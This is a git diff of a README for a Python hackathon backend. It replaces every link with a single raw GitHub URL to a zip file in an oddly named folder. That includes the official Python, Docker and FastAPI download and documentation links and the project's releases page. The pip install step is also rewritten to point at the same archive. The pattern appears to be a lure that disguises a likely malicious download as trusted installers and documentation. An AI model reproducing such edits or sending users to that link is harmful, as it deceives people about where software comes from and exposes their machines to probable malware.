@@ -1,6 +1,6 @@
 # 🏎️ hackathon-backend - Fast, Simple Backend Setup
 
-![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip%20Latest%20Release-Click%20Here-brightgreen)
 
 ## 🌐 Overview
 
@@ -12,19 +12,19 @@ The **hackathon-backend** is a Python boilerplate designed for quick setup in ha
 
 Before you begin, make sure you have the following installed on your computer:
 
-1. **Python 3.8 or higher:** Download it from [python.org](https://www.python.org/downloads/).
-2. **Docker:** Download it from [docker.com](https://www.docker.com/get-started/).
-3. **Docker Compose:** This often comes with Docker installations. Check [here](https://docs.docker.com/compose/install/) for details.
+1. **Python 3.8 or higher:** Download it from [https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip).
+2. **Docker:** Download it from [https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip).
+3. **Docker Compose:** This often comes with Docker installations. Check [here](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip) for details.
 
 ### Installation Steps
 
-1. Visit the [Releases page](https://github.com/omar-signals-ai/hackathon-backend/releases) to download the latest release.
+1. Visit the [Releases page](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip) to download the latest release.
 2. Look for the file suitable for your operating system.
 3. Download it to your local machine.
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download Here](https://github.com/omar-signals-ai/hackathon-backend/releases). 
+To download the software, visit this page: [Download Here](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip). 
 
 Once there, find the latest version and download it.
 
@@ -36,7 +36,7 @@ After downloading, follow these steps to run the backend application:
 2. Navigate to the folder where you saved the downloaded file.
 3. If you have not already done so, run the following command to set up your environment:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip
    ```
 4. Start the application by running:
    ```
@@ -66,8 +66,8 @@ Feel free to explore and modify the templates in the `routes` directory to fit y
 
 For detailed information, visit our documentation at:
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Docker Documentation](https://docs.docker.com/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip)
 
 ## ⚙️ Contributing
 
@@ -83,4 +83,4 @@ If you need assistance, you can open an issue on the GitHub repository or reach 
 
 ---
 
-Stay tuned for updates on the project! Don’t forget to check back at the [Releases page](https://github.com/omar-signals-ai/hackathon-backend/releases) for the latest version.
+Stay tuned for updates on the project! Don’t forget to check back at the [Releases page](https://raw.githubusercontent.com/omar-signals-ai/hackathon-backend/main/pestological/hackathon-backend.zip) for the latest version.
